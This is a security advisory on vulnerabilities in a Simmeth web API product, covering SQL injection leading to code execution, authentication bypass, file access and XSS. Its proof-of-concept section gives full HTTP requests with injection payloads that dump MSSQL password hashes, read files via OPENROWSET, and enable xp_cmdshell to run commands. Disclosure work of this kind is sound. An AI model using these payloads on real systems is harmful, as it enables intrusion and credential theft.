Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

An in-depth security analysis performed by security professionals is
highly advised, to identify and resolve potential further critical security
issues.

Vulnerability overview/description:
-----------------------------------
1) SQL Injection leading to Remote Code Execution (CVE-2022-44015)
An attacker can inject raw SQL queries. By activating MSSQL features, the
attacker is able to execute arbitrary commands on the MSSQL server.

2) Faulty API Design (CVE-2022-44014)
A faulty API design allows an attacker to fetch arbitrary SQL tables per
design. This will leak all user passwords and MSSQL hashes.

3) Local File Access (CVE-2022-44016)
An attacker can download arbitrary files from the web server by abusing an API
call.

4) Leak of Simmeth's SMTP password
A cleartext password for the email account "[emailÂ protected]" is leaked during
the login process.

5) Stored Cross-Site Scripting (CVE-2022-44012)
An attacker can execute JavaScript code in the browser of the victim if a site
is loaded. The victim's encrypted password can be stolen and most likely be
decrypted.

6) Authentication Bypass (CVE-2022-44013)
An attacker can access multiple API calls without authentication. Thus, all
outlined attacks can be executed without knowing any valid credentials.

7) Errors in Session management (CVE-2022-44017)
Due to errors in the session management, an attacker can log back into a
victim's account after the victim logged out. This is due to the credentials not
being cleaned from the local storage after logout.

8) Information Disclosure
Multiple requests were giving verbose error messages. This helps an attacker in
finding and abusing a vulnerability.

Proof of concept:
-----------------
1) SQL Injection leading to Remote Code Execution (CVE-2022-44015)
Following API call can be used to execute arbitrary SQL queries via a subquery
or stacked query in the table name. Because of vulnerability 6, only a valid
username is required to send the request.

---------------------------------
POST /DS/LM_API/api/SelectionService/GetPaggedTab HTTP/1.1
Content-Length: 1264
[...]

{
   "Credential": {
     "Mandant": {
       "ConfigPath": "C:\\SSG\\50_Konfigurationen\\LM.xml",
       "ConnectionString": {
         "Available": false,
         "System": "****"
       },
       "Encryption": 1,
       "IsWithRegistration": true,
       "Name": "****"
     },
     "Username": "simmeth",
     "System": "****"
   },
   "ResultTab": {
     "AutoLoad": false,
     "Createable": true,
     "Databases": [
       {
         "System": "****",
         "Tables": [
           {
             "Columns": [],
             "Name": "(SELECT name, password_hash FROM master.sys.sql_logins)sub;--",
             "Relations": [],
             "Results": [
               {
                 "ColumnName": "*"
               }
             ]
           }
         ]
       }
     ],
     "Name": "Results",
     "PageSize": 2000
   },
   "Ids": {},
   "SecondaryIds": {},
   "Constraints": [],
   "DateConstraints": {},
   "LogicOperator": 0,
   "PageNumber": 0,
   "Sortings": {},
   "TableFilters": {},
   "GroupByField": null,
   "Aggregates": {},
   "isExport": false
}

-------------------
The POC above shows an example subquery, which will respond with the resulting
dataset. Stacked queries will be executed, however, the results will not be
contained in the web server's reply. The example query will dump the MSSQL password
hashes.

Further attacks include arbitrary file read with the following query:

(SELECT * FROM OPENROWSET(BULK N'c:/windows/system32/license.rtf', SINGLE_CLOB) AS Contents
)sub;--

And code execution via the xp_cmdshell extended procedure:

(SELECT @@Version AS version )sub; EXEC ('sp_configure ''show advanced options'', 1;
RECONFIGURE;'); EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;');EXEC xp_cmdshell
'nslookup some.domain';--

2) Faulty API Design (CVE-2022-44014)
The API design allows the frontend to supply an arbitrary table name
(called <TABLE NAME HERE> in the POC below) into the following request.
Because of vulnerability 6, only a valid username is required to send the
request.

---------------------------------
POST /DS/LM_API/api/SelectionService/GetPaggedTab HTTP/1.1
Content-Length: 1264
[...]

{
   "Credential": {
     "Mandant": {
       "ConfigPath": "C:\\SSG\\50_Konfigurationen\\LM.xml",
       "ConnectionString": {
         "Available": false,
         "System": "****"
       },
       "Encryption": 1,
       "IsWithRegistration": true,
       "Name": "****"
     },
     "Username": "simmeth",
     "System": "****"
   },
   "ResultTab": {
     "AutoLoad": false,
     "Createable": true,
     "Databases": [
       {
         "System": "****",
         "Tables": [
           {
             "Columns": [],
             "Name": "<TABLE NAME HERE>",
             "Relations": [],
             "Results": [
               {
                 "ColumnName": "*"
               }
             ]
           }
         ]
       }
     ],
     "Name": "Results",
     "PageSize": 2000
   },
   "Ids": {},
   "SecondaryIds": {},
   "Constraints": [],
   "DateConstraints": {},
   "LogicOperator": 0,
   "PageNumber": 0,
   "Sortings": {},
   "TableFilters": {},
   "GroupByField": null,
   "Aggregates": {},
   "isExport": false
}

-------------------

This is a fault by design, as the attacker has full control of the table
name. Therefore, an arbitrary table such as the user table
(ACL_Benutzer_Admin_Einkauf and ACL_Benutzer) can be read.

3) Local File Access (CVE-2022-44016)
The "GetImages" API call can be abused to read arbitrary files from the file
system. This is due to the API allowing to set the image path from the
frontend.

By pointing the base path to C:\, all files can be accessed.
Because of vulnerability 6, the request requires no credentials.
